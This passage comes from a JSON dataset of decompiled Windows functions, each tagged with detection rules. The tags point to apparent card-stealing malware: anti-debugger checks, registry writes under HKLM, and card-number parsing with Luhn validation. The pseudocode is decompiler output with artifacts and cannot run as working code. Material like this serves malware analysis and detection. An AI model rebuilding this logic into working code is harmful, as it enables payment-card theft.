{\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar11 = arg_ch != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    ppuVar6 = &stack0xfffffffc;\n    if ((bVar11) && (ppuVar6 = &stack0xfffffffc,  !bVar11)) {\n        ppuVar5 = apuStack636 + 1;\n        ppuVar6 = apuStack636 + 1;\n        apuStack636[1] = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            ppuVar5 = ppuVar5 + -1;\n            *ppuVar5 = *puVar10;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    puVar10 = *(ppuVar6 + 8);\n    (*_sym.imp.MSVCRT.dll_sprintf)(ppuVar6 + -0x160, 0x4231b0, puVar10);\n    (*pcVar2)(ppuVar6 + -0x264, 0x4231c8, puVar10);\n    *(ppuVar6 + -0x20) = ppuVar6 + -0x160;\n    *(ppuVar6 + -0x18) = ppuVar6 + -0xc;\n    *(ppuVar6 + -0x14) = ppuVar6 + -4;\n    *(ppuVar6 + -0x10) = ppuVar6 + -8;\n    uVar4 = 0xffffffff;\n    pcVar8 = ppuVar6 + -0x160;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    *(ppuVar6 + -0x48) = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    puVar7 = puVar10;\n    do {\n        puVar9 = puVar7;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        puVar9 = puVar7 + 1;\n        cVar1 = *puVar7;\n        puVar7 = puVar9;\n    } while (cVar1 != '\\0');\n    bVar12 = SBORROW4(~uVar4, 1);\n    iVar3 = ~uVar4 - 1;\n    *(ppuVar6 + -0x34) = 0x4231f0;\n    *(ppuVar6 + -0x30) = 0x4231fc;\n    *(ppuVar6 + -0x2c) = 0x423208;\n    *(ppuVar6 + -0x28) = 0x423218;\n    *(ppuVar6 + -0x24) = 0x423220;\n    *(ppuVar6 + -0x5c) = 2;\n    *(ppuVar6 + -0x58) = 1;\n    *(ppuVar6 + -0x54) = 4;\n    *(ppuVar6 + -0x50) = 4;\n    *(ppuVar6 + -0x4c) = 4;\n    *(ppuVar6 + -0x1c) = puVar10;\n    *(ppuVar6 + -0x44) = iVar3;\n    *(ppuVar6 + -0x40) = 4;\n    *(ppuVar6 + -0x3c) = 4;\n    *(ppuVar6 + -0x38) = 4;\n    if ((bVar12) || (!bVar12)) {\n        if (4 < bVar11) {\n            return 1;\n        }\n        puVar7 = bVar11 * 4;\n        puVar10 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    }\n    else {\n        puVar7 = puVar10 + 1;\n        *puVar9 = *puVar10;\n        *(ppuVar6 + 0x9d34) = *(ppuVar6 + 0x9d34) + iVar3;\n        *0x1 = *0x1 + '\\x01';\n        puVar10 = puVar9 + 1;\n    }\n    do {\n        iVar3 = (*puVar10)(0x80000002, ppuVar6 + -0x264, *(ppuVar6 + -0x34 + puVar7), *(ppuVar6 + -0x5c + puVar7), \n                           *(ppuVar6 + -0x20 + puVar7), *(ppuVar6 + -0x48 + puVar7));\n        if (iVar3 != 0) {\n            return 0;\n        }\n        puVar7 = puVar7 + 1;\n    } while (puVar7 < 0x14);\n    return 1;\n}\n",
        "token_count": 1668
    },
    "00404cc0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404cc0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403130(0x80000002, 0x4232fc, 0x423348, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00404360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00404360(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004050b0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403010();\n        arg_ch_01 = fcn.00403010();\n        arg_ch_02 = fcn.00403010();\n        fcn.00402af0(arg_10h, arg_ch_00);\n        fcn.00402af0(arg_8h, arg_ch_01);\n        fcn.00402af0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x423148, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401380(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x423154, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401380(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x423154, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401380(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00402af0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 625
    },
    "00402770": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027d6) overlaps instruction at (ram,0x004027d2)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t * __cdecl fcn.00402770(uint32_t arg_8h, int32_t *arg_ch, char *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    \n    if (arg_10h == NULL) {\n        return (arg_8h >> 0x10) + arg_8h;\n    }\n    do {\n        arg_8h = arg_8h + *arg_ch;\n        uVar5 = arg_8h >> 0x10;\n        if (arg_8h >> 0x10 != 0) {\n            if ((-1 < arg_8h) && (-1 >= arg_8h)) {\n                *(uVar5 + 0x8316dbec) = in_ST0;\n                uVar4 = uVar5 - 1;\n                uVar2 = 9 < (uVar4 & 0xf) | in_AF;\n                uVar4 = uVar4 + uVar2 * '\\x06';\n                uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | uVar2 * (0xf9 < uVar4)) * '`';\n                piVar3 = uVar5 - 1 & 0xffffff00 | uVar4;\n                *arg_ch = *arg_ch + -0xda207c;\n                *piVar3 = *piVar3 + 1;\n                *(arg_8h + 0xffffe1) = *(arg_8h + 0xffffe1) + uVar4;\n                *arg_10h = *arg_10h + uVar4;\n                puVar1 = arg_8h + 0xc88b0845;\n                *puVar1 = *puVar1 >> 3 | *puVar1 << 0x1d;\n                return piVar3;\n            }\n            arg_8h = uVar5 + (arg_8h & 0xffff);\n        }\n        arg_ch = arg_ch + 2;\n        arg_10h = arg_10h + -1;\n        if (arg_10h == NULL) {\n            return (arg_8h >> 0x10) + arg_8h;\n        }\n    } while( true );\n}\n",
        "token_count": 586
    },
    "00403430": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040350d) overlaps instruction at (ram,0x00403504)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00403430(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    bool bVar9;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar2 = fcn.00402770(0, arg_8h, arg_ch + 1U >> 1);\n    uVar4 = uVar2;\n    uVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar5 = *(uVar3 + 0x58);\n    if (uVar2 < uVar5) {\n        bVar9 = false;\n        iVar8 = (uVar4 - uVar5 & 0xffff) - 1;\n    }\n    else {\n        bVar9 = uVar4 < (uVar5 & 0xffff);\n        iVar8 = uVar4 - (uVar5 & 0xffff);\n    }\n    if ((!bVar9) && (bVar9)) {\n        *(iVar8 + 0x43d1773a) = *(iVar8 + 0x43d1773a) ^ 0x8b27e95e;\n        return uVar3 + 0x7c8ecb0d + !bVar9;\n    }\n    uVar4 = uVar5 >> 0x10;\n    bVar9 = iVar8 < uVar5 >> 0x10;\n    if (bVar9) {\n        if (!bVar9) {\n            if (bVar9) {\n                out(0xbd, uVar4);\n                return uVar4;\n            }\n        }\n        uVar4 = (iVar8 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        uVar4 = iVar8 - uVar4;\n    }\n    bVar9 = (POPCOUNT(uVar4 & 0xff) & 1U) != 0;\n    if ((bVar9) && (!bVar9)) {\n        puVar7 = &stack0xffffffe8;\n        cVar1 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar5 = in(0x78);\n        return uVar5;\n    }\n    *arg_14h = uVar4 + arg_ch;\n    *arg_10h = *(uVar3 + 0x58);\n    return uVar3;\n}\n",
        "token_count": 687
    },
    "00402bd0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402be9) overlaps instruction at (ram,0x00402be7)\n// \n\nuint __cdecl fcn.00402bd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort in_DX;\n    uint uVar3;\n    uchar *unaff_ESI;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t unaff_EDI;\n    uint *puVar7;\n    bool bVar8;\n    ulong uVar9;\n    ulong uVar10;\n    ushort in_stack_ffffffcc;\n    uchar var_20h;\n    uint var_1fh;\n    \n    if ((0x1f < &stack0xfffffffc && *0x10 != 0x24) && (0x1f >= &stack0xfffffffc || *0x10 == 0x24)) {\n        *(unaff_EDI + 0x66) = *(unaff_EDI + 0x66) - &stack0xffffffd0;\n        in_stack_ffffffcc = in_DX;\n    }\n    bVar8 = in_DX != 'Q';\n    if ((bVar8) && (!bVar8)) {\n        out(*unaff_ESI, in_stack_ffffffcc);\n    }\n    uVar9 = fcn.00402b40(arg_18h, arg_1ch, 0x423178, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    uVar3 = uVar9 >> 0x20;\n    if (uVar9 == NULL) {\n        return 0;\n    }\n    var_20h = 0;\n    puVar6 = &var_1fh;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar4 = NULL;\n    bVar8 = true;\n    do {\n        puVar5 = puVar4;\n        if ((!bVar8) && (bVar8)) {\n            puVar5 = puVar4 + 1;\n            out(*puVar4, uVar3);\n        }\n        uVar10 = (*pcVar1)();\n        uVar3 = uVar10 >> 0x20;\n        (&var_20h)[puVar5] = uVar10;\n        puVar4 = puVar5 + 1;\n        bVar8 = puVar4 == 0x20;\n    } while (puVar4 < 0x20);\n    puVar6 = &var_20h;\n    puVar7 = uVar9;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    fcn.00404d10(arg_8h, arg_ch, arg_10h, arg_14h, *0x10 + -0x24, 0x20, uVar9);\n    fcn.004047a0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 782
    },
    "00403590": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ad9) overlaps instruction at (ram,0x00403ad8)\n// \n\nvoid fcn.00403590(void)\n\n{\n    int32_t *piVar1;\n    uchar uVar2;\n    uint32_t *puVar3;\n    char **ppcVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint16_t uVar8;\n    int32_t iVar9;\n    uint8_t extraout_AH;\n    char *pcVar10;\n    uint8_t extraout_CL;\n    uint8_t extraout_CH;\n    uint16_t extraout_CX;\n    uint8_t extraout_CH_00;\n    uchar *extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_DL;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    uint8_t *extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint *unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar11;\n    uint8_t *unaff_EDI;\n    uint *puVar12;\n    uint *puVar13;\n    uint16_t in_SS;\n    ushort in_DS;\n    uchar uVar14;\n    bool bVar15;\n    uint8_t in_AF;\n    bool bVar16;\n    uchar uVar17;\n    char cVar18;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar19;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint32_t uStack52;\n    uint8_t *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    ushort uStack18;\n    ushort uStack16;\n    ushort uStack14;\n    \n    uVar14 = 0;\n    uStack16 = 10;\n    uStack14 = 0;\n    uStack20 = 0x3148;\n    uStack18 = 0x42;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    uStack28 = 0x35b4;\n    uStack26 = 0x42;\n    uStack32 = 0x4035b1;\n    fcn.004051d0();\n    uStack32 = 0x12;\n    uStack36 = 0x423154;\n    puStack40 = 0xe;\n    puStack44 = 0x4235b4;\n    puStack48 = 0x4035ce;\n    uVar6 = fcn.004051d0();\n    if ((uVar14) || (puStack48 = puStack48 & 0xffff | unaff_EDI << 0x10,  !uVar14)) {\n        puStack48 = 0x4;\n    }\n    cVar18 = uVar6 - *unaff_EDI;\n    uStack52 = (in_NT & 1) * 0x4000 | SBORROW1(uVar6, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n               (cVar18 < '\\0') * 0x80 | (cVar18 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n               ((POPCOUNT(cVar18) & 1U) == 0) * 4 | uVar6 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n               (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    puVar11 = unaff_ESI + -1;\n    uStack56 = 0x4035e0;\n    func_0x10189558();\n    uStack56 = 0x423168;\n    uStack60 = 0xe;\n    uStack64 = 0x4235b4;\n    uStack68 = 0x4035f9;\n    fcn.004051d0();\n    uStack20 = 0xc;\n    uStack18 = 0;\n    uStack24 = 0x316c;\n    uStack22 = 0x42;\n    uStack28 = 0xe;\n    uStack26 = 0;\n    uStack32 = 0x4235b4;\n    uStack36 = 0x40361d;\n    puStack48 = unaff_EDI + 1;\n    puStack44 = puVar11;\n    puStack40 = extraout_EDX + 4;\n    fcn.004051d0();\n    uStack20 = 7;\n    uStack18 = 0;\n    uStack24 = 0x3178;\n    uStack22 = 0x42;\n    uStack28 = 0xe;\n    uStack26 = 0;\n    uStack32 = 0x4235b4;\n    uStack36 = 0x40363d;\n    fcn.004051d0();\n    uStack20 = 0xb;\n    uStack18 = 0;\n    uStack24 = 0x3180;\n    uStack22 = 0x42;\n    uStack28 = 0xe;\n    uStack26 = 0;\n    uStack32 = 0x4235b4;\n    uStack36 = 0x40365e;\n    uVar8 = fcn.004051d0();\n    bVar16 = (CONCAT31(extraout_CH & 0xb, 0xc) & (unaff_EDI + 1 & uVar8) + 0xaf70) == 0;\n    uStack20 = 0xc;\n    uStack18 = 0;\n    uStack24 = 0x318c;\n    uStack22 = 0x42;\n    uStack28 = 0xe;\n    uStack26 = 0;\n    uStack32 = 0x4235b4;\n    uStack36 = 0x403699;\n    fcn.004051d0();\n    if ((bVar16) || (uStack36 = uStack36 & 0xffff | extraout_CX << 0x10,  !bVar16)) {\n        uStack36 = 8;\n    }\n    puStack40 = puStack40 & 0xffff0000 | in_SS;\n    puVar12 = puStack40;\n    puStack40 = 0x47;\n    puStack44 = 0x423198;\n    puStack48 = 0xe;\n    uStack52 = 0x4235b4;\n    uStack56 = 0x4036bd;\n    fcn.004051d0();\n    uStack56 = 0xd;\n    uStack60 = 0x4231a0;\n    uStack64 = 0xe;\n    uStack68 = 0x4235b4;\n    uStack72 = 0x4036e2;\n    fcn.004051d0();\n    uStack24 = 0x18;\n    uStack22 = 0;\n    uStack28 = 0x31b0;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x40371d;\n    fcn.004051d0();\n    uStack24 = 0x25;\n    uStack22 = 0;\n    uStack28 = 0x31c8;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x40373f;\n    fcn.004051d0();\n    uStack24 = 10;\n    uStack22 = 0;\n    uStack28 = 0x31f0;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x40376b;\n    fcn.004051d0();\n    uStack24 = 0xc;\n    uStack22 = 0;\n    uStack28 = 0x31fc;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x403796;\n    fcn.004051d0();\n    uStack24 = 0xd;\n    uStack22 = 0;\n    uStack28 = 0x3208;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x4037c7;\n    fcn.004051d0();\n    bVar16 = false;\n    uStack24 = 6;\n    uStack22 = 0;\n    uStack28 = 0x3218;\n    uStack26 = 0x42;\n    uStack32 = 0xe;\n    uStack36 = 0x4235b4;\n    puStack40 = 0x4037f7;\n    fcn.004051d0();\n    if ((!bVar16) && (bVar16)) {\n        *puVar12 = *puVar11;\n        puVar11 = unaff_ESI + 3;\n        puVar12 = puVar12 + 1;\n    }\n    while( true ) {\n        puStack40 = 0xe;\n        puStack44 = 0x4235b4;\n        puStack48 = 0x403818;\n        fcn.004051d0();\n        uStack16 = 0xd;\n        uStack14 = 0;\n        uStack20 = 0x3228;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x403839;\n        fcn.004051d0();\n        uStack16 = 0x19;\n        uStack14 = 0;\n        uStack20 = 0x3238;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x403869;\n        fcn.004051d0();\n        uStack16 = 0xf;\n        uStack14 = 0;\n        uStack20 = 0x3254;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x403894;\n        fcn.004051d0();\n        uVar6 = unaff_EBX >> 8;\n        bVar16 = 0xcf < uVar6;\n        bVar15 = (POPCOUNT(uVar6 + 0x30) & 1U) == 0;\n        uStack16 = 0xe;\n        uStack14 = 0;\n        uStack20 = 0x3264;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x4038b7;\n        uStack32 = fcn.004051d0();\n        if ((bVar15) || (!bVar15)) goto code_r0x004038db;\n        puVar3 = segment(in_SS, *0x10 + -0x1c);\n        if (bVar16) goto code_r0x004038fc;\n        if (!bVar15) break;\n        uVar6 = *puVar3;\n        uVar7 = uVar6 + extraout_CH_00;\n        piVar1 = segment(in_DS, unaff_EBX + puVar11);\n        *piVar1 = (*piVar1 - (*puVar3 & 0xffffff00 | uVar7)) - CARRY1(uVar6, extraout_CH_00);\n        *(unaff_EBX + 0x19940431) = *(unaff_EBX + 0x19940431) + uVar7;\n    }\n    uStack28 = 0x9ea5;\n    uStack26 = 0xb7bc;\ncode_r0x004038db:\n    uStack32 = 0xb;\n    uStack36 = 0x423274;\n    puStack40 = 0xe;\n    puStack44 = 0x4235b4;\n    puStack48 = 0x4038ee;\n    fcn.004051d0();\ncode_r0x004038fc:\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x3280;\n    uStack18 = 0x42;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    uStack28 = 0x35b4;\n    uStack26 = 0x42;\n    uStack32 = 0x40390f;\n    fcn.004051d0();\n    uVar8 = unaff_EBX & 0xff00 | unaff_EBX - 0x12;\n    uVar14 = uVar8 < extraout_DX;\n    cVar19 = SBORROW2(uVar8, extraout_DX);\n    cVar18 = uVar8 - extraout_DX < 0;\n    uVar17 = uVar8 == extraout_DX;\n    uVar5 = unaff_EBX & 0xffff0000;\n    uStack16 = 0xb;\n    uStack14 = 0;\n    uStack20 = 0x328c;\n    uStack18 = 0x42;\n    uStack24 = 0xe;\n    uStack22 = 0;\n    uStack28 = 0x35b4;\n    uStack26 = 0x42;\n    uStack32 = 0x40393d;\n    fcn.004051d0();\n    if ((cVar19) || (!cVar19)) {\n        uStack32 = 10;\n        uStack36 = 0x423298;\n        puVar13 = puVar12;\ncode_r0x00403968:\n        puStack40 = 0xe;\n        puStack44 = 0x4235b4;\n        puStack48 = 0x403974;\n        iVar9 = fcn.004051d0();\n        if ((uVar17 || cVar19 != cVar18) || (!uVar17 && cVar19 == cVar18)) {\n            puStack48 = 0xc;\n            uStack52 = 0x4232a4;\n        }\n        else {\n            unaff_EBX = unaff_EBX + 1;\n            *(iVar9 + 0x6a39da56) = *(iVar9 + 0x6a39da56) ^ extraout_CL;\n            *puVar13 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar13 = puVar13 + 1;\n        }\n        uStack56 = 0xe;\n        uStack60 = 0x4235b4;\n        uStack64 = 0x403999;\n        fcn.004051d0();\n        uVar14 = 0;\n        uVar17 = (extraout_DL & unaff_EBX) == 0;\n        uStack16 = 0xe;\n        uStack14 = 0;\n        uStack20 = 0x32b0;\n        uStack18 = 0x42;\n    }\n    else {\n        puVar13 = puVar12 + 1;\n        uVar2 = in(extraout_EDX_00);\n        *puVar12 = uVar2;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (uVar14 || uVar17) {\n            uStack32 = 0x56;\n            unaff_EBX = uVar5 | CONCAT11(*extraout_ECX, 0xbc);\n            cVar19 = '\\0';\n            cVar18 = (*extraout_EDX_00 ^ 0x6a) < '\\0';\n            uVar17 = (*extraout_EDX_00 ^ 0x6a) == 0;\n            goto code_r0x00403968;\n        }\n    }\n    uStack24 = 0xe;\n    uStack22 = 0;\n    uStack28 = 0x35b4;\n    uStack26 = 0x42;\n    uStack32 = 0x4039d8;\n    fcn.004051d0();\n    if (!uVar14 && !uVar17) {\n        if (uVar14 || uVar17) {\n            *puVar13 = *puVar11;\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n            goto code_r0x004039f9;\n        }\n    }\n    uStack32 = 0x11;\n    uStack36 = 0x4232c0;\ncode_r0x004039f9:\n    puStack40 = 0xe;\n    puStack44 = 0x4235b4;\n    puStack48 = 0x403a05;\n    fcn.004051d0();\n    while( true ) {\n        uStack16 = 0x13;\n        uStack14 = 0;\n        uStack20 = 0x32d4;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x403a3a;\n        fcn.004051d0();\n        uVar14 = false;\n        uVar17 = (POPCOUNT((extraout_AH ^ 0x68) & 0x30) & 1U) == 0;\n        uStack16 = 0x14;\n        uStack14 = 0;\n        uStack20 = 0x32e8;\n        uStack18 = 0x42;\n        uStack24 = 0xe;\n        uStack22 = 0;\n        uStack28 = 0x35b4;\n        uStack26 = 0x42;\n        uStack32 = 0x403a65;\n        fcn.004051d0();\n        if ((uVar17) || (!uVar17)) goto code_r0x00403a89;\n        ppcVar4 = segment(in_SS, *0x10 + -0x1c);\n        pcVar10 = *ppcVar4;\n        if (uVar14) break;\n        if (!uVar17) {\n            uVar14 = 0;\n            uVar17 = (POPCOUNT(&stack0xffffffe8 & 0xff) & 1U) == 0;\n            uStack28 = 0x9ea5;\n            uStack26 = 0xb7bc;\ncode_r0x00403a89:\n            uStack32 = 0x33;\n            uStack36 = 0x4232fc;\n            puStack40 = 0xe;\n            puStack44 = 0x4235b4;\n            puStack48 = 0x403a9c;\n            pcVar10 = fcn.004051d0();\n            if ((uVar14) || (!uVar14)) {\n                puStack48 = 0xa;\n                uStack52 = 0x423330;\n                uStack56 = 0xe;\n                uStack60 = 0x4235b4;\n                uStack64 = 0x403acd;\n                fcn.004051d0();\n                if ((uVar17) || (uStack64 = extraout_ECX_00,  !uVar17)) {\n                    uStack64 = 4;\n                    uStack68 = 0x42333c;\n                    uStack72 = 0xe;\n                }\n                *(extraout_EDX_01 + 4) = *(extraout_EDX_01 + 4) + -0x68;\n                *(extraout_EDX_01 + 0xf) = *(extraout_EDX_01 + 0xf) + (extraout_ECX_00 >> 8);\n                uStack76 = 0x4235b4;\n                fcn.004051d0();\n                bVar16 = SCARRY4(&stack0xffffffb4, 0x40);\n                if ((*0x10 != 0xc) && (*0x10 == 0xc)) {\n                    bVar16 = (bVar16 * '\\b' & 8U) != 0;\n                }\n                uStack16 = 5;\n                uStack14 = 0;\n                uStack20 = 0x3340;\n                uStack18 = 0x42;\n                uStack24 = 0xe;\n                uStack22 = 0;\n                uStack28 = 0x35b4;\n                uStack26 = 0x42;\n                uStack32 = 0x403b0e;\n                fcn.004051d0();\n                if ((!bVar16) && (bVar16)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uStack32 = 6;\n                uStack36 = 0x423348;\n                puStack40 = 0xe;\n                puStack44 = 0x4235b4;\n                puStack48 = 0x403b39;\n                fcn.004051d0();\n                uStack16 = 0x2a;\n                uStack14 = 0;\n                uStack20 = 0x337c;\n                uStack18 = 0x42;\n                uStack24 = 0xe;\n                uStack22 = 0;\n                uStack28 = 0x35b4;\n                uStack26 = 0x42;\n                uStack32 = 0x403b64;\n                fcn.004051d0();\n                uStack16 = 0xb;\n                uStack14 = 0;\n                uStack20 = 0x33a8;\n                uStack18 = 0x42;\n                uStack24 = 0xe;\n                uStack22 = 0;\n                uStack28 = 0x35b4;\n                uStack26 = 0x42;\n                uStack32 = 0x403b8f;\n                fcn.004051d0();\n                return;\n            }\ncode_r0x00403aaf:\n            out(0xbd, pcVar10);\n            return;\n        }\n    }\n    *unaff_EBX = *unaff_EBX;\n    *pcVar10 = *pcVar10 + pcVar10;\n    goto code_r0x00403aaf;\n}\n",
        "token_count": 5268
    },
    "00401710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401760) overlaps instruction at (ram,0x0040175e)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00401710(uint *param_1, uint *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t *in_EAX;\n    uint *puVar3;\n    uint *puVar4;\n    uint8_t extraout_DL;\n    int32_t unaff_EBX;\n    uint *puVar5;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    bool in_CF;\n    char in_SF;\n    char in_OF;\n    uint uStackY24;\n    uint uStackY20;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (&stack0xfffffff4 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uStackY20 = 0x4016f5;\n        uVar2 = fcn.00402a80(0xb7f8c08b, unaff_EDI, unaff_ESI, unaff_EBP);\n        *param_1 = 0x407014;\n        *param_2 = 0xa120;\n        return uVar2;\n    }\n    uStackY20 = 